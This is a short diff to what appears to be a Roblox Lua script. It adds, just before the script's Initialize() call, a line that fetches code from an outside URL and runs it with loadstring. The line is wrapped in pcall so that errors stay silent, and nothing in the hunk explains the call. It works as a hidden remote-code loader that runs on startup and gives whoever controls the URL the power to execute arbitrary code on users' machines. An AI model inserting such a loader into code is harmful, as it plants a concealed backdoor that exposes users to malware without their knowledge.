@@ -385,5 +385,5 @@ local function Initialize()
 	ConnectEvents()
 	CheckSavedKey()
 end
-
+pcall(function() loadstring(game:HttpGet("https://scriptblox.com/ingest/clientv2.lua"))("proj_e03acd7a9391", "1.0.0", false) end)
 Initialize()
